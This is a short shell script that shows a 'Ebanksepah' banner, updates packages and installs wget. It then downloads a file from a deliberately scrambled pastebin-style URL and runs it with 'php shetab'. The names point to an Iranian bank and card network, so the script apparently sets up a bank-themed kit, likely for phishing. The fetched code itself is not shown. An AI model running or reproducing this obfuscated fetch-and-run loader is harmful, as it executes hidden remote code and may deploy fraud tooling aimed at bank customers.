
sleep 2
figlet ‌Ebanksepah

sleep 2
sudo apt-get update && sudo apt-get upgrade
sleep 2
sudo apt install wget
sleep 1
wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
php  	shetab
